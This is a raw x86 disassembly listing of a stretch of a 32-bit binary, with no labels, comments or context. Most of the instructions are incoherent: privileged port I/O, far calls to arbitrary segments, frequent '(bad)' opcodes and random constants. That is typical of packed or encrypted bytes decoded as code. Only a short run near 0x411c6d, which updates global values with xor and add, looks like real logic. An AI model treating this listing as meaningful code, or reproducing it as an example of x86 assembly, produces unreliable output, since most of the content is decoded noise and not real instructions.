  411754:	inc    esp
  411755:	cli    
  411756:	in     eax,dx
  411757:	int3   
  411758:	cmp    DWORD PTR [esp+ebp*4+0x3c],edx
  41175c:	test   eax,0xbc0834d5
  411761:	pop    edx
  411762:	xor    esi,DWORD PTR [esi-0x63]
  411765:	outs   dx,DWORD PTR ds:[esi]
  411766:	retf   
  411767:	ss dec esi
  411769:	retf   0xc85c
  41176c:	dec    eax
  41176d:	mov    esp,ebp
  41176f:	sub    al,0xb3
  411771:	push   eax
  411772:	xchg   ebp,eax
  411773:	out    dx,al
  411774:	mov    bl,0x62
  411776:	pushf  
  411777:	mov    edi,0x1bf1196c
  41177c:	faddp  st(6),st
  41177e:	fdivr  DWORD PTR gs:[ecx+0xa]
  411782:	xlat   BYTE PTR ds:[ebx]
  411783:	lods   eax,DWORD PTR ds:[esi]
  411784:	pop    esp
  411785:	xor    DWORD PTR [ebx],eax
  411787:	(bad)  
  411789:	xchg   edi,eax
  41178a:	add    eax,0x5072f3d1
  41178f:	clc    
  411790:	imul   ecx,DWORD PTR [ebp+0x1c],0xffffffef
  411794:	int    0x4
  411796:	imul   DWORD PTR [eax+eax*8]
  411799:	jns    0x4117dc
  41179b:	(bad)  
  41179c:	cmc    
  41179d:	and    al,0xdc
  4117a0:	dec    esp
  4117a1:	mov    esp,0xc3593499
  4117a6:	mov    ecx,0xfaea4406
  4117ab:	mov    ecx,0x577ea0c0
  4117b0:	cmpxchg BYTE PTR [edx],ah
  4117b3:	xor    eax,0x41657135
  4117b8:	fsubrp st(6),st
  4117ba:	xor    BYTE PTR [edi],0x56
  4117bd:	mov    edx,0x76ee0d2b
  4117c2:	inc    eax
  4117c3:	mov    bh,0xfa
  4117c5:	jge    0x4117a6
  4117c7:	fnstcw WORD PTR [eax+ebp*2+0x7d]
  4117cb:	adc    DWORD PTR [ebx-0x46],edx
  4117ce:	scas   eax,DWORD PTR es:[edi]
  4117cf:	push   edi
  4117d0:	lahf   
  4117d1:	dec    eax
  4117d2:	xor    bl,BYTE PTR [ebx]
  4117d4:	fidiv  DWORD PTR [eax+ecx*8-0x456c4c2d]
  4117db:	push   ecx
  4117dc:	and    BYTE PTR [edi+0xe],dh
  4117df:	mov    ch,ch
  4117e1:	aas    
  4117e2:	(bad)  
  4117e4:	cli    
  4117e5:	pushf  
  4117e6:	cdq    
  4117e7:	sahf   
  4117e8:	iret   
  4117e9:	aaa    
  4117ea:	jmp    0x41186b
  4117ec:	test   al,0x4e
  4117ee:	retf   0x4dfd
  4117f1:	mov    edi,0xcf8505d1
  4117f6:	xor    al,0x85
  4117f8:	popa   
  4117f9:	cmp    DWORD PTR [eax],esi
  4117fb:	lahf   
  4117fc:	xrelease xchg DWORD PTR [ecx+ebx*1+0x35078890],esp
  411804:	push   edx
  411805:	push   esi
  411806:	mov    ebx,0x2a755c29
  41180b:	mov    ecx,0xe7103300
  411810:	sub    DWORD PTR [ecx-0x59],edx
  411813:	add    eax,0x8a450f51
  411819:	mov    al,BYTE PTR [ebx+0x28]
  41181c:	mov    BYTE PTR [ecx+0x48],cl
  41181f:	mov    bl,0x9c
  411821:	call   0x36d5:0x118a1993
  411828:	jge    0x4117cf
  41182a:	es (bad) 
  41182c:	adc    eax,0xe78d699d
  411831:	jecxz  0x41180d
  411833:	imul   ecx,DWORD PTR [eax+0x3399cff7],0x2
  41183a:	push   0x2b0c758b
  41183f:	ret    0x581
  411842:	cmc    
  411843:	std    
  411844:	inc    edx
  411845:	add    BYTE PTR [edi],bh
  411847:	jg     0x411849
  411849:	add    BYTE PTR [ebx],dh
  41184b:	rol    edi,0x5
  41184e:	jp     0x41184e
  411850:	inc    edx
  411851:	add    BYTE PTR [ecx+0x57],dh
  411854:	add    BYTE PTR [eax],al
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fe76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx-0x5cc0fe17],dl
  41187c:	in     eax,dx
  41187d:	jbe    0x4118d6
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x411854
  411886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411887:	xor    dh,BYTE PTR [ebx-0x23]
  41188a:	test   bl,al
  41188c:	(bad)  
  41188d:	not    DWORD PTR [ebx]
  41188f:	out    dx,al
  411890:	sbb    ebx,DWORD PTR [edx+0x5fa8b1b]
  411896:	jb     0x4118ad
  411898:	dec    ecx
  411899:	outs   dx,DWORD PTR ds:[esi]
  41189a:	cmp    eax,0xc30f9674
  41189f:	cmp    al,BYTE PTR [edi]
  4118a1:	call   0xe8b7:0x42237d0f
  4118a8:	enter  0x2541,0x9a
  4118ac:	xchg   al,cl
  4118ae:	adc    eax,0x9de8b543
  4118b3:	int    0x21
  4118b5:	xchg   ecx,eax
  4118b6:	mov    fs,esp
  4118b8:	in     al,0xb7
  4118ba:	shl    DWORD PTR [esi+0x1075246a],cl
  4118c0:	lds    ecx,FWORD PTR [eax-0x7e]
  4118c3:	or     eax,0x62a726ef
  4118c8:	mov    al,gs:0x58c2ff4f
  4118ce:	cmp    esp,DWORD PTR [ecx+0x71]
  4118d1:	or     ah,bl
  4118d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118d4:	mov    ebp,0x86afa00
  4118d9:	jmp    0x41192d
  4118db:	dec    ecx
  4118dc:	ficomp WORD PTR [ebp+0x1c1df9f4]
  4118e2:	ret    
  4118e3:	(bad)  
  4118e4:	cmc    
  4118e5:	push   ebp
  4118e6:	xor    eax,esi
  4118e8:	pop    edi
  4118e9:	and    DWORD PTR [ecx+esi*4-0x1ab88dce],ebx
  4118f0:	jl     0x411907
  4118f2:	sub    esp,DWORD PTR [edi+0x11989bfa]
  4118f8:	sub    eax,0x89291b33
  4118fd:	xlat   BYTE PTR ds:[ebx]
  4118fe:	jmp    0x4118bf
  411900:	mov    bh,0x28
  411902:	loope  0x4118c0
  411904:	ror    bh,cl
  411906:	stc    
  411907:	into   
  411908:	sub    DWORD PTR [esi],ebp
  41190a:	fs dec edx
  41190c:	sub    DWORD PTR [eax],esp
  41190e:	test   BYTE PTR [esi+0x6c],0xc2
  411912:	pop    esi
  411913:	imul   edx,DWORD PTR [edx+esi*2+0x588f45d0],0xd7e382bf
  41191e:	(bad)  [eax+0x7d4079e7]
  411924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411925:	mov    DWORD PTR [esi+0x2],edx
  411928:	loopne 0x41197c
  41192a:	jl     0x41198c
  41192c:	les    ebx,FWORD PTR [ecx-0x7189f9a3]
  411932:	mov    dh,0xa8
  411934:	jae    0x41198d
  411936:	into   
  411937:	(bad)  
  411938:	jnp    0x41190f
  41193a:	xor    BYTE PTR [ebx+edx*4+0x64ab612d],al
  411941:	ins    DWORD PTR es:[edi],dx
  411942:	shr    bl,cl
  411944:	push   ebx
  411945:	cmp    BYTE PTR ds:0xeefdb69c,dh
  41194b:	xor    DWORD PTR [ebx+0x55],eax
  41194e:	jne    0x41190d
  411950:	mov    cl,0x74
  411952:	icebp  
  411953:	popf   
  411954:	call   DWORD PTR [ecx-0x3c4fc8df]
  41195a:	ins    DWORD PTR es:[edi],dx
  41195b:	inc    esi
  41195c:	add    dh,BYTE PTR [edx]
  41195e:	retf   0x8afe
  411961:	loope  0x411936
  411963:	ds xchg edi,eax
  411965:	ja     0x41192b
  411967:	nop
  411968:	ds ds es fs inc ebp
  41196d:	lods   eax,DWORD PTR ds:[esi]
  41196e:	jae    0x411988
  411970:	add    eax,DWORD PTR [ebx]
  411972:	je     0x41196d
  411974:	mov    ah,BYTE PTR [eax]
  411976:	jmp    0x9c24b745
  41197b:	fisttp QWORD PTR [ecx-0x44892c85]
  411981:	call   0x6491:0xc979f8a6
  411988:	leave  
  411989:	fld1   
  41198b:	xor    al,bl
  41198d:	xchg   ecx,eax
  41198e:	pop    ss
  41198f:	push   ds
  411990:	ins    BYTE PTR es:[edi],dx
  411991:	lock dec esi
  411993:	scas   eax,DWORD PTR es:[edi]
  411994:	pop    es
  411995:	fldz   
  411997:	out    0x42,eax
  411999:	add    bh,dl
  41199b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41199c:	xor    al,0xdb
  41199e:	sbb    al,0x7f
  4119a0:	mov    ebp,0x5b0898a2
  4119a5:	out    dx,al
  4119a6:	cli    
  4119a7:	icebp  
  4119a8:	or     DWORD PTR [eax-0x57],0xffffffa9
  4119ac:	jmp    0x4119ab
  4119ae:	inc    esp
  4119af:	(bad)  
  4119b0:	xor    al,0xaa
  4119b2:	dec    ebx
  4119b3:	pop    esp
  4119b4:	xor    ch,BYTE PTR [edx+edx*8-0x2de84dea]
  4119bb:	mov    al,0x1d
  4119bd:	daa    
  4119be:	mov    DWORD PTR [ecx-0x19c7fe75],ecx
  4119c4:	stos   BYTE PTR es:[edi],al
  4119c5:	dec    eax
  4119c6:	adc    eax,0xa17b8db4
  4119cb:	mov    esi,0x60476da9
  4119d0:	fisub  WORD PTR [ecx]
  4119d2:	out    0xbc,eax
  4119d4:	add    BYTE PTR [edi+eiz*1+0x208d6839],bh
  4119db:	das    
  4119dc:	lods   eax,DWORD PTR ds:[esi]
  4119dd:	rcl    BYTE PTR [esi-0x1e],1
  4119e0:	sub    DWORD PTR [eax+0x465c7ed8],esi
  4119e6:	or     eax,0xf7a6c693
  4119eb:	scas   al,BYTE PTR es:[edi]
  4119ec:	dec    esp
  4119ed:	push   ecx
  4119ee:	jle    0x411a2e
  4119f0:	and    eax,esp
  4119f2:	test   dl,dl
  4119f4:	pop    ecx
  4119f5:	sub    al,0xfd
  4119f7:	aaa    
  4119f8:	ror    DWORD PTR fs:[eax+0x7e],cl
  4119fc:	inc    edi
  4119fd:	push   cs
  4119fe:	mov    DWORD PTR [edx],edi
  411a00:	outs   dx,DWORD PTR ds:[esi]
  411a01:	xchg   ebp,eax
  411a02:	sub    DWORD PTR [ebx-0x68],0xb8fa7133
  411a09:	mov    esi,0x41f4fe7b
  411a0e:	inc    edx
  411a0f:	push   es
  411a10:	fistp  WORD PTR [ecx]
  411a12:	xchg   ebp,eax
  411a13:	mov    WORD PTR [ebx-0x4d],gs
  411a16:	int3   
  411a17:	enter  0x2cde,0x6c
  411a1b:	mov    cl,dl
  411a1d:	jo     0x4119b4
  411a1f:	fild   WORD PTR [edi-0x41cb8e17]
  411a25:	mov    BYTE PTR [eax-0x41],cl
  411a28:	mov    DWORD PTR [edx-0x2],ebp
  411a2b:	ss jle 0x411a8d
  411a2e:	sub    BYTE PTR [ecx+edi*1],0x2b
  411a32:	sbb    eax,0xfb4fbc5d
  411a37:	push   eax
  411a38:	mov    DWORD PTR [esp+edx*4-0x227c740],esi
  411a3f:	outs   dx,BYTE PTR ds:[esi]
  411a40:	jo     0x411ab4
  411a42:	jns    0x4119cf
  411a44:	dec    edx
  411a45:	push   cs
  411a46:	inc    ah
  411a48:	push   ebx
  411a49:	or     bh,BYTE PTR [ebx+ebx*1-0x73cb0e1c]
  411a50:	fild   DWORD PTR [esi+0xafd0233]
  411a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a57:	push   esi
  411a58:	and    eax,0x6d843fae
  411a5d:	cs push 0xffffffc7
  411a60:	or     ch,0xb4
  411a63:	frstor [ecx-0x17]
  411a66:	pop    eax
  411a67:	jmp    0xfeab4017
  411a6c:	jmp    0x411a0a
  411a6e:	je     0x411a85
  411a70:	or     DWORD PTR [edx-0x34d24e4f],eax
  411a76:	sbb    eax,0x5cc22ece
  411a7b:	adc    DWORD PTR [ebx+0x207963c2],eax
  411a81:	popa   
  411a82:	mov    cs,WORD PTR [ebx]
  411a84:	xor    ah,BYTE PTR [esi]
  411a86:	or     DWORD PTR [edi-0x61],esi
  411a89:	adc    edi,DWORD PTR [edx]
  411a8b:	lock inc ebx
  411a8d:	inc    ecx
  411a8e:	dec    esi
  411a8f:	mov    ebp,0xe84b60aa
  411a94:	into   
  411a95:	je     0x411a38
  411a97:	cmp    edx,DWORD PTR [ebx+edi*1-0x17d5390]
  411a9e:	mov    esi,0x6e70e01e
  411aa3:	xlat   BYTE PTR ds:[ebx]
  411aa4:	xor    esp,DWORD PTR [ebp+0x76]
  411aa7:	mov    eax,ds:0x780a0ba2
  411aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aad:	pop    edi
  411aae:	push   eax
  411aaf:	push   ebp
  411ab0:	push   eax
  411ab1:	jo     0x411ae8
  411ab3:	into   
  411ab4:	cmp    al,0xaa
  411ab6:	inc    ecx
  411ab7:	fwait
  411ab8:	in     eax,dx
  411ab9:	icebp  
  411aba:	mov    ebx,0x68975135
  411abf:	push   0x49
  411ac1:	dec    DWORD PTR [ebx+0xfe13d1b]
  411ac7:	or     eax,0xc60b0e5a
  411acc:	fimul  WORD PTR [eax]
  411ace:	dec    edx
  411acf:	add    DWORD PTR [ecx],ebx
  411ad1:	or     ebx,DWORD PTR [edi+0x28ab19f5]
  411ad7:	aad    0x8f
  411ad9:	xor    esp,DWORD PTR [ebx+0x70]
  411adc:	ret    
  411add:	retf   0x41c1
  411ae0:	jns    0x411ab7
  411ae2:	sub    edi,ebx
  411ae4:	and    eax,0x8825fc0e
  411ae9:	inc    ebx
  411aea:	mov    esp,0x24408611
  411aef:	fisttp WORD PTR [edi+0x4b0f6c7e]
  411af5:	dec    ebp
  411af6:	mov    edx,0xae7bce50
  411afb:	adc    BYTE PTR [edx+ebx*2-0x5b],bl
  411aff:	pandn  mm7,QWORD PTR [esi*1-0x5c9f07ec]
  411b07:	and    ebx,0xffffffc0
  411b0a:	addr16 jae 0x411b4a
  411b0d:	js     0x411b7d
  411b0f:	jo     0x411aec
  411b11:	fidiv  DWORD PTR [edi-0x1b63db89]
  411b17:	cmp    ch,BYTE PTR [eax+0x1a]
  411b1a:	dec    ebp
  411b1b:	jns    0x411ad7
  411b1d:	mov    edi,0x524de332
  411b22:	mov    bh,0x14
  411b24:	jl     0x411af2
  411b26:	add    edx,DWORD PTR [ecx-0x223fe505]
  411b2c:	xchg   edx,eax
  411b2d:	push   edx
  411b2e:	dec    esp
  411b2f:	stc    
  411b30:	mov    ch,0xeb
  411b32:	in     eax,dx
  411b33:	clc    
  411b34:	out    0x65,al
  411b36:	retf   
  411b37:	jmp    0x411b4e
  411b39:	cmc    
  411b3a:	mov    ecx,0xb97ef883
  411b3f:	jl     0x411b69
  411b41:	repz xchg edx,eax
  411b43:	jne    0x411b95
  411b45:	test   al,0x7f
  411b47:	jb     0x411b74
  411b49:	ins    DWORD PTR es:[edi],dx
  411b4a:	xor    al,0x6d
  411b4c:	add    eax,0xdb98ff5a
  411b51:	in     eax,0xde
  411b53:	sar    al,1
  411b55:	xlat   BYTE PTR ds:[ebx]
  411b56:	iret   
  411b57:	mov    ds:0x9091e43a,al
  411b5c:	mov    edx,DWORD PTR [ebx-0x303208a4]
  411b62:	(bad)  
  411b63:	cld    
  411b64:	(bad)  
  411b65:	les    esi,FWORD PTR [ecx+ecx*8]
  411b68:	enter  0x9be7,0x63
  411b6c:	int3   
  411b6d:	pushf  
  411b6e:	mov    ebx,0x346e2a0d
  411b73:	or     al,0x32
  411b75:	into   
  411b76:	aad    0xfd
  411b78:	(bad)  
  411b79:	sar    BYTE PTR [esi-0x3dc7b933],1
  411b7f:	and    BYTE PTR [edx+0x69b06315],0x76
  411b86:	mov    al,ds:0x72eeaf37
  411b8b:	hlt    
  411b8c:	pop    es
  411b8d:	sti    
  411b8e:	outs   dx,BYTE PTR ds:[esi]
  411b8f:	aas    
  411b90:	mov    bh,0x5e
  411b92:	mov    ds:0x2fcab77b,eax
  411b97:	ins    BYTE PTR es:[edi],dx
  411b98:	lods   eax,DWORD PTR ds:[esi]
  411b99:	or     DWORD PTR [esi-0x76],esi
  411b9c:	add    ebp,eax
  411b9e:	cli    
  411b9f:	jns    0x411beb
  411ba1:	jnp    0x411bac
  411ba3:	or     al,0x8
  411ba5:	lods   eax,DWORD PTR ds:[esi]
  411ba6:	ins    BYTE PTR es:[edi],dx
  411ba7:	pop    es
  411ba8:	out    0x8c,eax
  411baa:	dec    ecx
  411bab:	adc    esp,DWORD PTR [eax-0x4ab20811]
  411bb1:	or     eax,0xe0c99a64
  411bb6:	and    BYTE PTR [esi+0x42de3b5a],dl
  411bbc:	mov    ecx,0xc59be788
  411bc1:	mov    esp,0x91ed2f27
  411bc6:	add    DWORD PTR [ecx-0x1a8daa41],esi
  411bcc:	jge    0x411b70
  411bce:	push   0x36
  411bd0:	addr16 dec edi
  411bd2:	mov    ecx,0xb354c1c5
  411bd7:	in     eax,0x17
  411bd9:	outs   dx,DWORD PTR ds:[esi]
  411bda:	jno    0x411bc8
  411bdc:	gs mov bh,0x65
  411bdf:	imul   esp,edx,0x2debb232
  411be5:	xchg   ebx,eax
  411be6:	test   eax,0xa262d5c4
  411beb:	jecxz  0x411c46
  411bed:	or     edi,edi
  411bef:	cmp    eax,0xd5b9dc6
  411bf4:	cmp    al,dh
  411bf6:	lahf   
  411bf7:	mov    dl,0xfa
  411bf9:	cli    
  411bfa:	(bad)  
  411bfb:	lods   al,BYTE PTR ds:[esi]
  411bfc:	adc    eax,ebp
  411bfe:	outs   dx,BYTE PTR ds:[esi]
  411bff:	sub    ebp,DWORD PTR [edx+0x5d]
  411c02:	mov    es,WORD PTR [eax-0xa]
  411c05:	je     0x411c5b
  411c07:	mov    ds,WORD PTR [esp+ecx*2-0x4de474fb]
  411c0e:	push   edx
  411c0f:	(bad)  
  411c11:	xor    cl,ch
  411c13:	xor    dl,BYTE PTR [ebp-0x26]
  411c16:	repnz dec eax
  411c18:	stos   BYTE PTR es:[edi],al
  411c19:	mov    ah,cl
  411c1b:	bound  ebx,QWORD PTR [ecx-0x80]
  411c1e:	retf   
  411c1f:	adc    DWORD PTR [ecx],esp
  411c21:	mov    esi,0x4d20a02f
  411c26:	jp     0x411be9
  411c28:	jmp    0x45ab:0x61feca4
  411c2f:	cmp    dl,bl
  411c31:	add    DWORD PTR [esi+0x524fecdf],eax
  411c37:	pop    edx
  411c38:	xor    cl,BYTE PTR [edx+0x6d]
  411c3b:	mov    ah,0xe4
  411c3d:	pop    ecx
  411c3e:	jo     0x411c16
  411c40:	cmp    BYTE PTR [edx-0x634f5617],cl
  411c46:	ds jo  0x411c69
  411c49:	mov    al,ds:0x44a0f045
  411c4e:	push   0xffffff9b
  411c50:	xchg   edi,eax
  411c51:	sub    BYTE PTR [edx+ecx*8-0x63],dh
  411c55:	sub    al,0xc8
  411c57:	xchg   edi,eax
  411c58:	outs   dx,BYTE PTR ds:[esi]
  411c59:	sbb    BYTE PTR [ecx+0x9],dl
  411c5c:	pop    es
  411c5d:	jmp    FWORD PTR [edx+edx*8-0x6c]
  411c61:	js     0x411caa
  411c63:	scas   al,BYTE PTR es:[edi]
  411c64:	cdq    
  411c65:	popa   
  411c66:	mov    ds:0xf63dfeb7,ax
  411c6c:	nop
  411c6d:	mov    eax,ds:0x41b22c
  411c72:	add    eax,DWORD PTR ds:0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0x4190c55e
  411cb8:	cmp    BYTE PTR [esi+0x53],bl
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411c7a
  411cc2:	pop    ds
  411cc3:	xchg   ebx,eax
  411cc4:	ret    0x9413
  411cc7:	loopne 0x411cfe
  411cc9:	push   0xb4ba0805
  411cce:	xchg   ecx,eax
  411ccf:	pusha  
  411cd0:	add    al,0xae
  411cd2:	retf   0x4e8e
  411cd5:	xor    ebp,DWORD PTR [edi+0x1cbb4872]
  411cdb:	bound  edx,QWORD PTR [ecx]
  411cdd:	shr    BYTE PTR [edi-0x2d2e5039],1
  411ce3:	sbb    eax,0x414c90
  411ce8:	jno    0x411d0b
  411cea:	shr    BYTE PTR [eax+0x14bbb1e5],0xb1
  411cf1:	repz jnp 0x411ccc
  411cf4:	and    DWORD PTR [ecx+0x2b],edi
  411cf7:	fisttp QWORD PTR [eax+0x60]
  411cfa:	push   ds
  411cfb:	fwait
  411cfc:	xor    al,0xcc
  411cfe:	enter  0x1ded,0xb6
  411d02:	mov    dl,0x8e
  411d04:	cwde   
  411d05:	gs in  al,0xd2
  411d08:	jmp    0x4b1696e3
  411d0d:	jecxz  0x411d09
  411d0f:	repnz fcmovne st,st(4)
  411d12:	adc    DWORD PTR [edx-0x182183b3],ebp
  411d18:	jbe    0x411d76
  411d1a:	mov    dl,0xa6
  411d1c:	push   edi
  411d1d:	push   edx
  411d1e:	loop   0x411ccb
  411d20:	mov    esp,0x93c1b8b4
  411d25:	stc    
  411d26:	lds    edi,FWORD PTR [edx+0x30]
  411d29:	sbb    al,0x85
  411d2b:	in     al,0xb3
  411d2d:	test   eax,0x9d677d5c
  411d32:	pop    esp
  411d33:	mov    bh,BYTE PTR [esi+ecx*2-0x6b3eb471]
  411d3a:	xor    ecx,DWORD PTR [esi]
  411d3c:	pusha  
  411d3d:	jmp    FWORD PTR [edx+eiz*4]
  411d40:	adc    al,0x8f
  411d42:	icebp  
  411d43:	out    dx,eax
  411d44:	aad    0x85
  411d46:	adc    bl,dh
  411d48:	mov    dl,0x36
  411d4a:	ja     0x411dc4
  411d4c:	inc    ecx
  411d4d:	adc    BYTE PTR [ecx],ch
  411d4f:	xor    al,dh
  411d51:	xchg   esp,eax
  411d52:	in     eax,0xea
  411d54:	add    DWORD PTR [edx+0x42f45b5d],edx
  411d5a:	pop    edi
  411d5b:	and    dl,dl
  411d5d:	sub    ch,cl
  411d5f:	jmp    0xa833:0xb01defb5
  411d66:	mov    dh,0x82
  411d68:	(bad)  
  411d6a:	or     al,BYTE PTR [eax-0x6d238a36]
  411d70:	pop    esp
  411d71:	xor    DWORD PTR [ecx+ecx*4+0x29],eax
  411d75:	rol    DWORD PTR [edx],cl
  411d77:	fild   QWORD PTR [edx+ebx*8+0x30]
  411d7b:	adc    al,BYTE PTR [esi+eax*1+0x439fcdb7]
  411d82:	fdivrp st(4),st
  411d84:	sbb    eax,0xab202ad7
  411d89:	in     al,0x7d
  411d8b:	mov    esp,0x1f6006a0
  411d90:	mov    cl,0xf3
  411d92:	mov    dl,0x8b
  411d94:	mov    ebp,0xfdffa548
  411d9a:	mov    ds:0x1b9cd63b,al
  411d9f:	sbb    DWORD PTR ds:0x982d494e,ebx
  411da5:	xchg   edx,eax
  411da6:	int3   
  411da7:	ret    0x11ca
  411daa:	js     0x411de9
  411dac:	pop    ebp
  411dad:	cdq    
  411dae:	test   ecx,esp
  411db0:	icebp  
  411db1:	inc    ebp
  411db2:	rcl    BYTE PTR [esi],1
  411db4:	in     al,0xd8
  411db6:	ins    BYTE PTR es:[edi],dx
  411db7:	adc    eax,0x880a4d49
  411dbc:	lods   eax,DWORD PTR ds:[esi]
  411dbd:	lods   al,BYTE PTR ds:[esi]
  411dbe:	mov    al,al
  411dc0:	sar    ah,1
  411dc2:	test   BYTE PTR [ecx],dl
  411dc4:	(bad)  
  411dc5:	es xchg esp,eax
  411dc7:	inc    edi
  411dc8:	jg     0x411d51
  411dca:	mov    edx,0xcbb870ff
  411dcf:	into   
  411dd0:	loope  0x411d5c
  411dd2:	dec    esi
  411dd3:	retw   0xc546
  411dd7:	dec    edx
  411dd8:	sbb    BYTE PTR [ebx],dh
  411dda:	fsubr  st(0),st
  411ddc:	stos   BYTE PTR es:[edi],al
  411ddd:	cli    
  411dde:	or     ecx,DWORD PTR [ecx+eax*8-0x6cb317f9]
  411de5:	adc    edx,DWORD PTR [esi-0x63]
  411de8:	outs   dx,DWORD PTR ds:[esi]
  411de9:	push   esi
  411dea:	adc    al,0xa4
  411dec:	jae    0x411dd0
  411dee:	push   edi
  411def:	es popf 
  411df1:	push   edi
  411df2:	pushf  
  411df3:	sub    bh,BYTE PTR [edi+0x5016347]
  411df9:	cli    
  411dfa:	dec    ebx
  411dfb:	lea    ebx,[eax+0x36]
  411dfe:	ds (bad) 
  411e01:	cwde   
  411e02:	jb     0x411dc2
  411e04:	shr    BYTE PTR [esp+esi*4+0x6d242651],cl
  411e0b:	sub    bh,bl
  411e0d:	dec    esp
  411e0e:	xor    al,BYTE PTR [esi+0x7dd030a2]
  411e14:	dec    eax
  411e15:	loop   0x411d9a
  411e17:	dec    ecx
  411e18:	(bad)  
  411e1a:	loopne 0x411dfa
  411e1c:	and    ebp,DWORD PTR [ebp+0x18]
  411e1f:	cli    
  411e20:	sar    BYTE PTR ds:0xea6ff386,1
  411e26:	sbb    eax,0x2d244ef7
  411e2b:	dec    esp
  411e2c:	shr    BYTE PTR [ebx],0x78
  411e2f:	sub    eax,0x71195ca6
  411e34:	int3   
  411e35:	cmp    esi,DWORD PTR [edx+ecx*4+0x3b]
  411e39:	aas    
  411e3a:	push   esp
  411e3b:	sub    BYTE PTR [ecx],cl
  411e3d:	mov    ds:0x1ae9aa9c,eax
  411e42:	push   ebx
  411e43:	rcr    ebx,0x43
  411e46:	das    
  411e47:	shr    DWORD PTR [edx+0xecb3c9],cl
  411e4d:	imul   ebx,DWORD PTR [eax+0x28],0xffffffe0
  411e51:	mov    ebx,0xf3cf6c8a
  411e56:	mov    gs,WORD PTR [edi+0x149c4815]
  411e5c:	or     BYTE PTR [eax-0x71],0xa8
  411e60:	mov    edx,0x49ec55bc
  411e65:	ret    
  411e66:	push   es
  411e67:	push   ebp
  411e68:	fstp   TBYTE PTR [ebp+0x11]
  411e6b:	vfnmsub231pd xmm2,xmm5,xmm0
  411e70:	shr    DWORD PTR [ebp+eax*4-0x33e5ff6b],cl
  411e77:	sbb    al,0xee
  411e79:	and    edi,DWORD PTR [edi-0x1a]
  411e7c:	mov    esi,0xd90df5d3
  411e81:	push   ecx
  411e82:	test   eax,0x35235828
  411e87:	sub    bh,BYTE PTR [esi+0x3a]
  411e8a:	cmc    
  411e8b:	xor    al,0x90
  411e8d:	push   edi
  411e8e:	(bad)  
  411e8f:	les    ebx,FWORD PTR [ebp+eax*2-0x15]
  411e93:	cmp    bh,BYTE PTR [ebx+0x5345d6fe]
  411e99:	pop    eax
  411e9a:	jle    0x411e44
  411e9c:	ins    BYTE PTR es:[edi],dx
  411e9d:	adc    DWORD PTR [ecx-0xc],0xf2c1c8c9
  411ea4:	ret    
  411ea5:	loopne 0x411f12
  411ea7:	idiv   edi
  411ea9:	stc    
  411eaa:	sbb    BYTE PTR fs:[ecx+0x5fff09ed],ah
  411eb1:	xchg   ecx,eax
  411eb2:	scas   eax,DWORD PTR es:[edi]
  411eb3:	mov    dl,0xd8
  411eb5:	xchg   ebx,eax
  411eb6:	cs pop edx
  411eb8:	test   eax,0x346b13af
  411ebd:	push   ebx
  411ebe:	push   0x53
  411ec0:	and    eax,0xcc3c3f7b
  411ec5:	mov    ebp,DWORD PTR ds:0x29d52435
  411ecb:	xchg   ebp,eax
  411ecc:	sbb    edx,ecx
  411ece:	cmp    dl,BYTE PTR [esi-0x5f]
  411ed1:	mov    ds:0xa49be15d,al
  411ed6:	jae    0x411f3e
  411ed8:	xor    esp,DWORD PTR [eax]
  411eda:	mov    dh,0xb0
  411edc:	inc    ebx
  411edd:	call   0x15b5:0xef8b3d6f
  411ee4:	sar    ch,1
  411ee6:	adc    eax,DWORD PTR ds:0x80ceb9e4
  411eec:	retf   0x7744
  411eef:	bound  esp,QWORD PTR [esi-0x39]
  411ef2:	fld    TBYTE PTR [eax+0xa]
  411ef5:	push   edi
  411ef6:	mov    eax,ds:0x71b978f1
  411efb:	mov    dl,0xca
  411efd:	rol    ah,0xfb
  411f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f01:	fistp  DWORD PTR [esi-0x5e]
  411f04:	adc    esp,esp
  411f06:	fdiv   QWORD PTR [ebx+0x6581043b]
  411f0c:	add    al,0xcb
  411f0e:	push   ebp
  411f0f:	pop    ds
  411f10:	pop    ss
  411f11:	cmp    cl,BYTE PTR [eax-0x2729a25a]
  411f17:	mov    bh,0xe1
  411f19:	jl     0x411f60
  411f1b:	dec    eax
  411f1c:	sbb    esp,0x2e
  411f1f:	pop    esp
  411f20:	pop    ds
  411f21:	test   BYTE PTR ds:0x59f654ce,dh
  411f27:	jae    0x411eb8
  411f29:	lods   eax,DWORD PTR ds:[esi]
  411f2a:	add    eax,0xd7692224
  411f2f:	retf   
  411f30:	jle    0x411f2e
  411f32:	addr16 jbe 0x411fb2
  411f35:	rcr    cl,cl
  411f37:	loopne 0x411efc
  411f39:	repnz cmp cl,BYTE PTR [edx]
  411f3c:	push   0xe866c95b
  411f41:	adc    WORD PTR [ebp-0x76367514],ax
  411f48:	xor    eax,0x899ee05c
  411f4d:	frstor [eax+0x63e73c7]
  411f53:	dec    esp
  411f54:	(bad)  
  411f55:	cwde   
  411f56:	mov    esi,0xb45d4125
